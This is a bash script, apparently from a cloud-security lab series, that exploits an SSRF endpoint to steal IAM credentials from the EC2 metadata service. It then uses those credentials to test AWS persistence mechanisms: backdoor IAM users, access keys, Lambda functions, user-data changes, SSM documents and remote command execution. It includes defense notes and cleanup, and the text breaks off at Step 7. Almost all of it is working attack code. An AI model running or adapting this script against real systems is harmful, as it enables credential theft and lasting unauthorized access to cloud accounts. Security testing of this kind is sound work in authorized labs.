#!/usr/bin/env bash
# =============================================================================
# 17_persistence_check.sh — Persistence Mechanism Feasibility Analysis
# =============================================================================
# Purpose:
#   Assess whether stolen IAM credentials allow establishing persistent access
#   that survives EC2 reboot, credential rotation, or partial remediation.
#   Uses read-only checks by default. --level2 enables actual creation + cleanup.
#
# Persistence mechanisms tested:
#   1. IAM User creation (backdoor account)
#   2. IAM Access Key creation (persistent credentials)
#   3. Lambda function creation (serverless backdoor)
#   4. EC2 user-data modification (boot-time backdoor)
#   5. SSM Document / Automation (managed backdoor)
#   6. EventBridge Rule (scheduled backdoor)
#   7. Security Group modification (network backdoor)
#
# Usage:
#   ./17_persistence_check.sh           # Level 1 permission checks only
#   ./17_persistence_check.sh --level2  # Level 1 + Level 2 actual create + cleanup
#
# Learning points:
#   - Persistence is entirely IAM-dependent, NOT network-dependent
#   - Config A and Config B produce identical results
#   - Even read-only IAM roles can reveal persistence opportunities
#   - Defense: least-privilege IAM, SCPs, CloudTrail monitoring
#
# Defenses:
#   - IAM least privilege (remove iam:Create*, lambda:Create*, etc.)
#   - SCPs blocking dangerous actions at organization level
#   - CloudTrail + GuardDuty for anomaly detection
#   - Regular credential rotation
#   - Config Rules monitoring for unauthorized changes
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

# =============================================================================
# Argument parsing
# =============================================================================
LEVEL2=false
for arg in "$@"; do
    case "${arg}" in
        --level2)
            LEVEL2=true
            ;;
    esac
done

init_config

print_header "17: Persistence Mechanism Feasibility Analysis"

RESULT_FILE="17_persistence_check.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

if [[ "${LEVEL2}" == "true" ]]; then
    echo -e "${YELLOW}[!] WARNING: --level2 enabled. Creation attempts will be made. Auto-cleanup on exit.${NC}"
    echo ""
fi

# Persistence check counters
POSSIBLE_COUNT=0
DENIED_COUNT=0
UNKNOWN_COUNT=0
TOTAL_CHECKS=0

# Level 2 cleanup state
_l2_user_created=false
_l2_access_key_id=""
_l2_lambda_created=false
_l2_ssm_doc_name=""
_l2_eb_rule_name=""
_l2_sg_id=""
_l2_sg_rule_created=false

# Store mechanism results for summary table
declare -a MECH_NAMES=()
declare -a MECH_STATUS=()
declare -a MECH_RISK=()

record_possible() {
    local msg="$1"
    ((POSSIBLE_COUNT++)) || true
    ((TOTAL_CHECKS++)) || true
    print_vulnerable "${msg}"
    result_text+="[POSSIBLE] ${msg}"$'\n'
}

record_denied() {
    local msg="$1"
    ((DENIED_COUNT++)) || true
    ((TOTAL_CHECKS++)) || true
    print_blocked "${msg}"
    result_text+="[DENIED] ${msg}"$'\n'
}

record_unknown() {
    local msg="$1"
    ((UNKNOWN_COUNT++)) || true
    ((TOTAL_CHECKS++)) || true
    print_info "${msg}"
    result_text+="[UNKNOWN] ${msg}"$'\n'
}

# =============================================================================
# Step 1: Credential theft and validation
# =============================================================================
# Retrieve the IAM role name and temporary credentials from IMDS via SSRF,
# then validate them with aws sts get-caller-identity.
# =============================================================================
print_header "Step 1: Credential Theft and Validation"

result_text+="==============================="$'\n'
result_text+="Step 1: Credential Theft and Validation"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Retrieving IAM role name from IMDS via SSRF${NC}"

iam_role=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/" 2>/dev/null) || iam_role=""

if [[ -z "${iam_role}" ]] || echo "${iam_role}" | grep -qi "404\|not found\|error\|<?xml"; then
    echo -e "${YELLOW}[!] Unable to detect IAM role${NC}"

    imds_check=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/" 2>/dev/null) || imds_check=""
    if echo "${imds_check}" | grep -qi "Token required\|unauthorized\|401"; then
        print_blocked "IMDSv2 enforced — IMDS access blocked from SSRF"
        result_text+="IMDSv2 enforced: SSRF access blocked"$'\n'
    elif [[ -z "${imds_check}" ]]; then
        print_info "Cannot reach IMDS or application"
        result_text+="IMDS: Unreachable"$'\n'
    else
        print_info "IMDS is accessible but no IAM role is attached"
        result_text+="IAM role: None (metadata access possible)"$'\n'
    fi

    save_result "${RESULT_FILE}" "${result_text}"
    log "Persistence check: Exiting — no IAM role found"
    exit 0
fi

echo -e "${RED}  IAM role: ${iam_role}${NC}"
result_text+="IAM role: ${iam_role}"$'\n'

echo -e "${BLUE}[*] Retrieving temporary credentials...${NC}"
creds_json=$(curl -sS -m 10 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/iam/security-credentials/${iam_role}" 2>/dev/null) || creds_json=""

if [[ -z "${creds_json}" ]] || ! echo "${creds_json}" | grep -qi "AccessKeyId"; then
    echo -e "${RED}[!] Failed to retrieve credentials${NC}"
    echo -e "  Response: ${creds_json:0:200}"
    result_text+="Credential retrieval: Failed"$'\n'
    save_result "${RESULT_FILE}" "${result_text}"
    exit 1
fi

export AWS_ACCESS_KEY_ID=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['AccessKeyId'])" 2>/dev/null)
export AWS_SECRET_ACCESS_KEY=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['SecretAccessKey'])" 2>/dev/null)
export AWS_SESSION_TOKEN=$(echo "${creds_json}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Token'])" 2>/dev/null)

echo -e "${RED}  Credentials loaded into environment variables${NC}"
echo -e "  AccessKeyId: ${AWS_ACCESS_KEY_ID}"
result_text+="AccessKeyId: ${AWS_ACCESS_KEY_ID}"$'\n'

region=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/region" 2>/dev/null) || region=""
if [[ -z "${region}" ]] || echo "${region}" | grep -qi "404\|error"; then
    az_val=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/placement/availability-zone" 2>/dev/null) || az_val=""
    if [[ -n "${az_val}" ]]; then
        region="${az_val%[a-z]}"
    else
        region="ap-northeast-1"
    fi
fi
export AWS_DEFAULT_REGION="${region}"
echo -e "  Region: ${region}"
result_text+="Region: ${region}"$'\n'

# Get instance ID from IMDS (needed for EC2 user-data check)
instance_id=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/instance-id" 2>/dev/null) || instance_id=""
if echo "${instance_id}" | grep -qi "404\|error"; then
    instance_id=""
fi
echo -e "  Instance ID: ${instance_id:-not available}"
result_text+="Instance ID: ${instance_id:-not available}"$'\n'

echo ""
echo -e "${BLUE}[*] Validating credentials: aws sts get-caller-identity${NC}"
caller_id=$(aws sts get-caller-identity --output json 2>&1) || caller_id="Failed"

if echo "${caller_id}" | grep -qi "UserId"; then
    echo "${caller_id}" | python3 -m json.tool 2>/dev/null | sed 's/^/    /' || echo "    ${caller_id}"

    account_id=$(echo "${caller_id}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Account'])" 2>/dev/null || echo "unknown")
    role_arn=$(echo "${caller_id}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Arn'])" 2>/dev/null || echo "unknown")

    result_text+="AccountId: ${account_id}"$'\n'
    result_text+="Arn: ${role_arn}"$'\n'

    print_vulnerable "Credential theft and validation succeeded — AccountId: ${account_id}"
else
    echo -e "${RED}[!] Credentials are invalid${NC}"
    echo "    ${caller_id}"
    result_text+="Credential validation: Failed — ${caller_id}"$'\n'
    save_result "${RESULT_FILE}" "${result_text}"
    exit 1
fi

echo ""

# Extract role name for IAM operations
extracted_role=$(echo "${role_arn}" | sed 's|.*/assumed-role/||; s|/.*||')
if [[ -z "${extracted_role}" ]] || [[ "${extracted_role}" == "${role_arn}" ]]; then
    extracted_role="${iam_role}"
fi

# Trap: cleanup env vars and any Level 2 resources
cleanup() {
    # Level 2 cleanup: IAM user
    if [[ "${_l2_user_created}" == "true" ]]; then
        aws iam delete-user --user-name "persistence-test-DO-NOT-USE" 2>/dev/null || true
    fi
    # Level 2 cleanup: IAM access key (delete from current user/role)
    if [[ -n "${_l2_access_key_id}" ]]; then
        aws iam delete-access-key --access-key-id "${_l2_access_key_id}" 2>/dev/null || true
    fi
    # Level 2 cleanup: Lambda function
    if [[ "${_l2_lambda_created}" == "true" ]]; then
        aws lambda delete-function --function-name "persistence-test-DO-NOT-USE" 2>/dev/null || true
    fi
    # Level 2 cleanup: SSM document
    if [[ -n "${_l2_ssm_doc_name}" ]]; then
        aws ssm delete-document --name "${_l2_ssm_doc_name}" 2>/dev/null || true
    fi
    # Level 2 cleanup: EventBridge rule
    if [[ -n "${_l2_eb_rule_name}" ]]; then
        aws events remove-targets --rule "${_l2_eb_rule_name}" --ids "persistence-test-target" 2>/dev/null || true
        aws events delete-rule --name "${_l2_eb_rule_name}" 2>/dev/null || true
    fi
    # Level 2 cleanup: SG ingress rule
    if [[ "${_l2_sg_rule_created}" == "true" ]] && [[ -n "${_l2_sg_id}" ]]; then
        aws ec2 revoke-security-group-ingress \
            --group-id "${_l2_sg_id}" \
            --protocol tcp --port 19998 --cidr 203.0.113.0/32 2>/dev/null || true
    fi
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_DEFAULT_REGION 2>/dev/null || true
}
trap cleanup EXIT

# =============================================================================
# Step 2: IAM User Creation Check
# =============================================================================
# A backdoor IAM user with its own access key survives EC2 reboot, instance
# termination, and even rotation of the original instance role credentials.
# This is the most persistent mechanism because the user exists independently
# of any EC2 instance.
# =============================================================================
print_header "Step 2: IAM User Creation Check"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 2: IAM User Creation Check"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Testing iam:CreateUser permission${NC}"
echo -e "${BLUE}[*] A backdoor IAM user with its own access key survives ALL credential rotations${NC}"
echo ""

# Attempt to create a sentinel user to probe the permission
create_user_result=$(aws iam create-user --user-name "persistence-test-DO-NOT-USE" --output json 2>&1) || true

if echo "${create_user_result}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "iam:CreateUser — Cannot create backdoor IAM users"
    MECH_NAMES+=("IAM User Creation")
    MECH_STATUS+=("DENIED")
    MECH_RISK+=("CRITICAL")
elif echo "${create_user_result}" | grep -qi "EntityAlreadyExists\|User.*already exists"; then
    # User already exists from a previous run — permission is clearly granted
    record_possible "iam:CreateUser — Permission GRANTED (backdoor user creation possible; test user already exists)"
    MECH_NAMES+=("IAM User Creation")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("CRITICAL")
    if [[ "${LEVEL2}" == "true" ]]; then
        echo -e "${YELLOW}  [!] Level 2: Cleaning up pre-existing test user${NC}"
        aws iam delete-user --user-name "persistence-test-DO-NOT-USE" 2>/dev/null || true
    fi
elif echo "${create_user_result}" | grep -qi "UserId\|User.*created\|\"User\""; then
    record_possible "iam:CreateUser — Permission GRANTED (backdoor user creation SUCCEEDED)"
    MECH_NAMES+=("IAM User Creation")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("CRITICAL")
    if [[ "${LEVEL2}" == "true" ]]; then
        _l2_user_created=true
        echo -e "${YELLOW}  [!] Level 2: Deleting test user immediately${NC}"
        aws iam delete-user --user-name "persistence-test-DO-NOT-USE" 2>/dev/null || true
        _l2_user_created=false
    else
        echo -e "${YELLOW}  [!] Test user was created — deleting now (run again with --level2 to confirm)${NC}"
        aws iam delete-user --user-name "persistence-test-DO-NOT-USE" 2>/dev/null || true
    fi
else
    record_unknown "iam:CreateUser — Unexpected response: ${create_user_result:0:150}"
    MECH_NAMES+=("IAM User Creation")
    MECH_STATUS+=("UNKNOWN")
    MECH_RISK+=("CRITICAL")
fi

echo ""

# =============================================================================
# Step 3: IAM Access Key Creation Check
# =============================================================================
# Even if the IMDS temporary credentials (STS session tokens) expire after
# 1-6 hours, a long-lived IAM Access Key persists until explicitly deleted.
# An attacker creating an access key for the current role's associated IAM
# user gains indefinite programmatic access.
# =============================================================================
print_header "Step 3: IAM Access Key Creation Check"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 3: IAM Access Key Creation Check"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Testing iam:CreateAccessKey permission${NC}"
echo -e "${BLUE}[*] Long-lived access keys survive STS session expiry and EC2 reboots${NC}"
echo ""

# Try to create an access key scoped to the current role's IAM identity.
# For assumed-role sessions, this typically requires iam:CreateAccessKey on
# the underlying IAM user. We probe it regardless.
create_key_result=$(aws iam create-access-key --output json 2>&1) || true

if echo "${create_key_result}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "iam:CreateAccessKey — Cannot create long-lived access keys"
    MECH_NAMES+=("IAM Access Key Creation")
    MECH_STATUS+=("DENIED")
    MECH_RISK+=("CRITICAL")
elif echo "${create_key_result}" | grep -qi "AccessKeyId\|\"AccessKey\""; then
    new_key_id=$(echo "${create_key_result}" | python3 -c "import json,sys; print(json.load(sys.stdin).get('AccessKey',{}).get('AccessKeyId',''))" 2>/dev/null || echo "")
    record_possible "iam:CreateAccessKey — GRANTED (long-lived key created: ${new_key_id})"
    MECH_NAMES+=("IAM Access Key Creation")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("CRITICAL")
    if [[ -n "${new_key_id}" ]]; then
        _l2_access_key_id="${new_key_id}"
        echo -e "${YELLOW}  [!] Deleting test access key immediately: ${new_key_id}${NC}"
        aws iam delete-access-key --access-key-id "${new_key_id}" 2>/dev/null || true
        _l2_access_key_id=""
    fi
elif echo "${create_key_result}" | grep -qi "LimitExceeded\|Cannot exceed quota"; then
    # Permission exists but quota is full — still a finding
    record_possible "iam:CreateAccessKey — Permission GRANTED (quota exceeded, but permission confirmed)"
    MECH_NAMES+=("IAM Access Key Creation")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("CRITICAL")
elif echo "${create_key_result}" | grep -qi "NoSuchEntity\|Cannot create access key"; then
    # Assumed-role sessions cannot have access keys directly; probe via iam:ListUsers
    echo -e "${YELLOW}  [*] Cannot create key on assumed-role session directly. Checking iam:ListUsers for target users...${NC}"
    list_users_result=$(aws iam list-users --output json 2>&1) || true
    if echo "${list_users_result}" | grep -qi "AccessDenied\|is not authorized"; then
        record_denied "iam:CreateAccessKey — Denied (assumed-role session; iam:ListUsers also denied)"
        MECH_NAMES+=("IAM Access Key Creation")
        MECH_STATUS+=("DENIED")
        MECH_RISK+=("CRITICAL")
    elif echo "${list_users_result}" | grep -qi "Users"; then
        user_count=$(echo "${list_users_result}" | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('Users',[])))" 2>/dev/null || echo "0")
        record_possible "iam:CreateAccessKey — Possible (${user_count} IAM user(s) visible; attacker could target them)"
        MECH_NAMES+=("IAM Access Key Creation")
        MECH_STATUS+=("POSSIBLE")
        MECH_RISK+=("CRITICAL")
    else
        record_unknown "iam:CreateAccessKey — Cannot determine (assumed-role context; ${create_key_result:0:100})"
        MECH_NAMES+=("IAM Access Key Creation")
        MECH_STATUS+=("UNKNOWN")
        MECH_RISK+=("CRITICAL")
    fi
else
    record_unknown "iam:CreateAccessKey — Unexpected response: ${create_key_result:0:150}"
    MECH_NAMES+=("IAM Access Key Creation")
    MECH_STATUS+=("UNKNOWN")
    MECH_RISK+=("CRITICAL")
fi

echo ""

# =============================================================================
# Step 4: Lambda Function Creation Check
# =============================================================================
# A Lambda function is a serverless persistent backdoor. Once created it can be:
#   - Triggered by a schedule (EventBridge Cron) — survives indefinitely
#   - Triggered by API Gateway — gives attacker a permanent HTTP endpoint
#   - Triggered by S3 events, SNS, SQS — fires on normal operational events
# Lambda functions are not removed by EC2 termination or credential rotation.
# =============================================================================
print_header "Step 4: Lambda Function Creation Check"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 4: Lambda Function Creation Check"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Testing lambda:CreateFunction permission${NC}"
echo -e "${BLUE}[*] Lambda backdoors survive EC2 termination and are triggered independently${NC}"
echo ""

# First probe: list existing Lambda functions (read-only recon)
echo -e "${BLUE}[*] lambda:ListFunctions — Checking if Lambda is in use${NC}"
list_functions_result=$(aws lambda list-functions --output json 2>&1) || true

if echo "${list_functions_result}" | grep -qi "AccessDenied\|is not authorized"; then
    print_info "lambda:ListFunctions: AccessDenied (cannot enumerate Lambda)"
    result_text+="lambda:ListFunctions: AccessDenied"$'\n'
elif echo "${list_functions_result}" | grep -qi "Functions"; then
    fn_count=$(echo "${list_functions_result}" | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('Functions',[])))" 2>/dev/null || echo "0")
    echo -e "  Existing Lambda functions: ${fn_count}"
    result_text+="lambda:ListFunctions: ${fn_count} function(s) found"$'\n'
    if [[ "${fn_count}" -gt 0 ]]; then
        echo "${list_functions_result}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for fn in data.get('Functions', [])[:5]:
        print(f\"  {fn['FunctionName']} (Runtime: {fn.get('Runtime','N/A')}, Role: {fn.get('Role','N/A')})\")
except: pass
" 2>/dev/null | sed 's/^/    /'
    fi
else
    print_info "lambda:ListFunctions: Unexpected response"
    result_text+="lambda:ListFunctions: Unexpected response"$'\n'
fi

echo ""

# Second probe: attempt to create a dummy Lambda (level 2 only creates; level 1 uses a bogus role to check permission)
echo -e "${BLUE}[*] Testing lambda:CreateFunction (probe via deliberately-invalid role ARN)${NC}"
lambda_probe_result=$(aws lambda create-function \
    --function-name "persistence-test-DO-NOT-USE" \
    --runtime "python3.12" \
    --role "arn:aws:iam::${account_id}:role/nonexistent-persistence-test-role" \
    --handler "index.handler" \
    --zip-file "fileb:///dev/null" \
    --output json 2>&1) || true

if echo "${lambda_probe_result}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "lambda:CreateFunction — Cannot create Lambda backdoor functions"
    MECH_NAMES+=("Lambda Function")
    MECH_STATUS+=("DENIED")
    MECH_RISK+=("HIGH")
elif echo "${lambda_probe_result}" | grep -qi "InvalidParameterValue\|ValidationException\|does not exist\|ResourceNotFoundException\|CodeStorageExceededException\|InvalidZipFileException"; then
    # Reached parameter validation — permission exists, the role/code was just invalid
    record_possible "lambda:CreateFunction — Permission GRANTED (validation error confirms permission; backdoor creation possible)"
    MECH_NAMES+=("Lambda Function")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("HIGH")
    if [[ "${LEVEL2}" == "true" ]]; then
        echo -e "${YELLOW}  [!] Level 2: Attempting real Lambda creation and immediate deletion${NC}"
        # Level 2: try with inline zip (minimal Python handler)
        tmp_zip=$(mktemp /tmp/lambda-test-XXXXXX.zip 2>/dev/null || echo "/tmp/lambda-test-$$.zip")
        python3 -c "
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr('index.py', 'def handler(e, c): return {}')
buf.seek(0)
open('${tmp_zip}', 'wb').write(buf.read())
" 2>/dev/null || true
        lambda_real_result=$(aws lambda create-function \
            --function-name "persistence-test-DO-NOT-USE" \
            --runtime "python3.12" \
            --role "arn:aws:iam::${account_id}:role/nonexistent-persistence-test-role" \
            --handler "index.handler" \
            --zip-file "fileb://${tmp_zip}" \
            --output json 2>&1) || true
        rm -f "${tmp_zip}" 2>/dev/null || true
        if echo "${lambda_real_result}" | grep -qi "FunctionArn\|FunctionName.*persistence"; then
            _l2_lambda_created=true
            echo -e "${RED}  Lambda function created — deleting immediately${NC}"
            aws lambda delete-function --function-name "persistence-test-DO-NOT-USE" 2>/dev/null || true
            _l2_lambda_created=false
        else
            echo -e "${YELLOW}  Level 2 Lambda creation: ${lambda_real_result:0:150}${NC}"
        fi
    fi
elif echo "${lambda_probe_result}" | grep -qi "FunctionArn\|FunctionName.*persistence"; then
    _l2_lambda_created=true
    record_possible "lambda:CreateFunction — GRANTED and function created (deleting now)"
    MECH_NAMES+=("Lambda Function")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("HIGH")
    aws lambda delete-function --function-name "persistence-test-DO-NOT-USE" 2>/dev/null || true
    _l2_lambda_created=false
else
    record_unknown "lambda:CreateFunction — Unexpected response: ${lambda_probe_result:0:150}"
    MECH_NAMES+=("Lambda Function")
    MECH_STATUS+=("UNKNOWN")
    MECH_RISK+=("HIGH")
fi

echo ""

# =============================================================================
# Step 5: EC2 User-Data Modification Check
# =============================================================================
# EC2 user-data is a script that runs at every instance boot (via cloud-init).
# If an attacker can modify user-data, any code they inject will execute
# automatically whenever the instance restarts — a boot-persistent backdoor
# that survives manual investigation of running processes.
# =============================================================================
print_header "Step 5: EC2 User-Data Modification Check"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 5: EC2 User-Data Modification Check"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] Testing ec2:ModifyInstanceAttribute (user-data)${NC}"
echo -e "${BLUE}[*] Boot-time backdoor: injected code runs on every EC2 reboot automatically${NC}"
echo ""

if [[ -z "${instance_id}" ]]; then
    echo -e "${YELLOW}[*] Instance ID not available from IMDS — attempting via ec2:DescribeInstances${NC}"
    desc_inst=$(aws ec2 describe-instances --output json 2>&1) || desc_inst=""
    if echo "${desc_inst}" | grep -qi "AccessDenied\|is not authorized"; then
        print_info "ec2:DescribeInstances: AccessDenied — cannot retrieve instance ID"
        result_text+="Instance ID: Not available (DescribeInstances denied)"$'\n'
    elif echo "${desc_inst}" | grep -qi "InstanceId"; then
        instance_id=$(echo "${desc_inst}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    for res in data.get('Reservations', []):
        for inst in res.get('Instances', []):
            if inst.get('State', {}).get('Name') == 'running':
                print(inst['InstanceId'])
                break
except: pass
" 2>/dev/null | head -1)
        echo -e "  Instance ID from DescribeInstances: ${instance_id:-none found}"
        result_text+="Instance ID (from DescribeInstances): ${instance_id:-not found}"$'\n'
    fi
fi

if [[ -n "${instance_id}" ]]; then
    echo -e "${BLUE}[*] ec2:ModifyInstanceAttribute --instance-id ${instance_id} --attribute userData${NC}"
    # NOTE: Instance must be stopped for user-data modification. We probe the
    # permission by passing the current (unchanged) user-data. An AccessDenied
    # error means no permission; other errors mean permission exists.
    current_userdata_b64=$(printf 'IyBwZXJzaXN0ZW5jZS10ZXN0LURPLU5PVC1VU0U=' 2>/dev/null || echo "")  # base64("# persistence-test-DO-NOT-USE")
    modify_result=$(aws ec2 modify-instance-attribute \
        --instance-id "${instance_id}" \
        --attribute userData \
        --value "${current_userdata_b64}" \
        --output json 2>&1) || true

    if echo "${modify_result}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
        record_denied "ec2:ModifyInstanceAttribute (userData) — Cannot inject boot-time backdoor"
        MECH_NAMES+=("EC2 User-Data Modification")
        MECH_STATUS+=("DENIED")
        MECH_RISK+=("CRITICAL")
    elif echo "${modify_result}" | grep -qi "IncorrectInstanceState\|not in a stopped state"; then
        # Permission exists but instance must be stopped first — still a finding
        record_possible "ec2:ModifyInstanceAttribute (userData) — Permission GRANTED (instance running; stop required to activate)"
        MECH_NAMES+=("EC2 User-Data Modification")
        MECH_STATUS+=("POSSIBLE")
        MECH_RISK+=("CRITICAL")
    elif [[ -z "${modify_result}" ]]; then
        # Empty response typically means success (modify-instance-attribute returns nothing on success)
        record_possible "ec2:ModifyInstanceAttribute (userData) — Permission GRANTED (modification accepted)"
        MECH_NAMES+=("EC2 User-Data Modification")
        MECH_STATUS+=("POSSIBLE")
        MECH_RISK+=("CRITICAL")
    else
        record_unknown "ec2:ModifyInstanceAttribute (userData) — Response: ${modify_result:0:150}"
        MECH_NAMES+=("EC2 User-Data Modification")
        MECH_STATUS+=("UNKNOWN")
        MECH_RISK+=("CRITICAL")
    fi
else
    echo -e "${YELLOW}[*] No instance ID available — checking ec2:ModifyInstanceAttribute permission generically${NC}"
    # Probe with a dummy instance ID to check for permission vs. parameter errors
    modify_dummy=$(aws ec2 modify-instance-attribute \
        --instance-id "i-00000000000000000" \
        --attribute userData \
        --value "dGVzdA==" \
        --output json 2>&1) || true
    if echo "${modify_dummy}" | grep -qi "AccessDenied\|is not authorized"; then
        record_denied "ec2:ModifyInstanceAttribute (userData) — Cannot inject boot-time backdoor"
        MECH_NAMES+=("EC2 User-Data Modification")
        MECH_STATUS+=("DENIED")
        MECH_RISK+=("CRITICAL")
    elif echo "${modify_dummy}" | grep -qi "InvalidInstanceID\|does not exist"; then
        record_possible "ec2:ModifyInstanceAttribute (userData) — Permission GRANTED (invalid instance ID used for probe)"
        MECH_NAMES+=("EC2 User-Data Modification")
        MECH_STATUS+=("POSSIBLE")
        MECH_RISK+=("CRITICAL")
    else
        record_unknown "ec2:ModifyInstanceAttribute (userData) — No instance ID; response: ${modify_dummy:0:150}"
        MECH_NAMES+=("EC2 User-Data Modification")
        MECH_STATUS+=("UNKNOWN")
        MECH_RISK+=("CRITICAL")
    fi
fi

echo ""

# =============================================================================
# Step 6: SSM Document / RunCommand Check
# =============================================================================
# SSM provides three persistence vectors:
#   ssm:CreateDocument   — custom document persists until explicitly deleted
#   ssm:SendCommand      — direct remote code execution on managed instances
#   ssm:StartAutomation  — automated workflows that can run on a schedule
# All three bypass network boundaries (SSM uses the AWS control plane API).
# =============================================================================
print_header "Step 6: SSM Document / RunCommand Check"

result_text+=$'\n'"==============================="$'\n'
result_text+="Step 6: SSM Document / RunCommand Check"$'\n'
result_text+="==============================="$'\n'

echo -e "${BLUE}[*] SSM persistence bypasses network boundaries — uses AWS control plane${NC}"
echo ""

# 6a: ssm:CreateDocument
echo -e "${BLUE}[*] Testing ssm:CreateDocument permission${NC}"
_l2_ssm_doc_name="persistence-test-DO-NOT-USE-$(date +%s)"
ssm_doc_content='{
  "schemaVersion": "2.2",
  "description": "persistence-test-DO-NOT-USE",
  "mainSteps": []
}'

create_doc_result=$(aws ssm create-document \
    --name "${_l2_ssm_doc_name}" \
    --document-type "Command" \
    --document-format "JSON" \
    --content "${ssm_doc_content}" \
    --output json 2>&1) || true

if echo "${create_doc_result}" | grep -qi "AccessDenied\|UnauthorizedAccess\|is not authorized"; then
    record_denied "ssm:CreateDocument — Cannot create persistent SSM documents"
    _l2_ssm_doc_name=""
    MECH_NAMES+=("SSM Document/Command")
    MECH_STATUS+=("DENIED")
    MECH_RISK+=("HIGH")
elif echo "${create_doc_result}" | grep -qi "DocumentInformation\|DocumentName\|DocumentStatus\|persistence-test"; then
    record_possible "ssm:CreateDocument — Permission GRANTED (custom SSM document created)"
    MECH_NAMES+=("SSM Document/Command")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("HIGH")
    echo -e "${YELLOW}  [!] Deleting test SSM document immediately${NC}"
    aws ssm delete-document --name "${_l2_ssm_doc_name}" 2>/dev/null || true
    _l2_ssm_doc_name=""
elif echo "${create_doc_result}" | grep -qi "DocumentAlreadyExists"; then
    record_possible "ssm:CreateDocument — Permission GRANTED (document name already exists from prior run)"
    MECH_NAMES+=("SSM Document/Command")
    MECH_STATUS+=("POSSIBLE")
    MECH_RISK+=("HIGH")
    aws ssm delete-document --name "${_l2_ssm_doc_name}" 2>/dev/null || true
    _l2_ssm_doc_name=""
else
    record_unknown "ssm:CreateDocument — Response: ${create_doc_result:0:150}"
    _l2_ssm_doc_name=""
    # Only add to table if not already added above
    MECH_NAMES+=("SSM Document/Command")
    MECH_STATUS+=("UNKNOWN")
    MECH_RISK+=("HIGH")
fi

echo ""

# 6b: ssm:SendCommand
echo -e "${BLUE}[*] Testing ssm:SendCommand permission${NC}"
ssm_instances_output=$(aws ssm describe-instance-information --output json 2>&1) || ssm_instances_output=""
first_ssm_instance=""

if echo "${ssm_instances_output}" | grep -qi "AccessDenied\|is not authorized"; then
    print_info "ssm:DescribeInstanceInformation: AccessDenied"
    result_text+="ssm:DescribeInstanceInformation: AccessDenied"$'\n'
elif echo "${ssm_instances_output}" | grep -qi "InstanceInformationList"; then
    first_ssm_instance=$(echo "${ssm_instances_output}" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    instances = data.get('InstanceInformationList', [])
    if instances:
        print(instances[0]['InstanceId'])
except: pass
" 2>/dev/null || echo "")
    echo -e "  SSM-managed instances found: ${first_ssm_instance:-none}"
    result_text+="SSM-managed instance: ${first_ssm_instance:-none}"$'\n'
fi

if [[ -n "${first_ssm_instance}" ]]; then
    send_cmd_result=$(aws ssm send-command \
        --instance-ids "${first_ssm_instance}" \
        --document-name "AWS-RunShellScript" \
        --parameters 'commands=["echo persistence-test-DO-NOT-USE"]' \
        --output json 2>&1) || true
    if echo "${send_cmd_result}" | grep -qi "AccessDenied\|is not authorized"; then
        print_blocked "ssm:SendCommand: AccessDenied — remote code execution blocked"
        result_text+="ssm:SendCommand: AccessDenied"$'\n'
    elif echo "${send_cmd_result}" | grep -qi "CommandId"; then
        cmd_id=$(echo "${send_cmd_result}" | python3 -c "import json,sys; print(json.load(sys.stdin)['Command']['CommandId'])" 2>/dev/null || echo "")
        print_vulnerable "ssm:SendCommand: GRANTED — CommandId: ${cmd_id} — direct remote code execution possible"
        result_text+="ssm:SendCommand: GRANTED (CommandId: ${cmd_id})"$'\n'
    else
        print_info "ssm:SendCommand: Unexpected response — ${send_cmd_result:0:100}"
        result_text+="ssm:SendCommand: Unexpected response"$'\n'
    fi
else
    print_info "ssm:SendCommand: Skipped — no SSM-managed instances found"
    result_text+="ssm:SendCommand: Skipped (no managed instances)"$'\n'
fi

echo ""

# =============================================================================
# Step 7: EventBridge Rule Creation Check
# =============================================================================
# An EventBridge (CloudWatch Events) rule with a cron schedule is an ideal
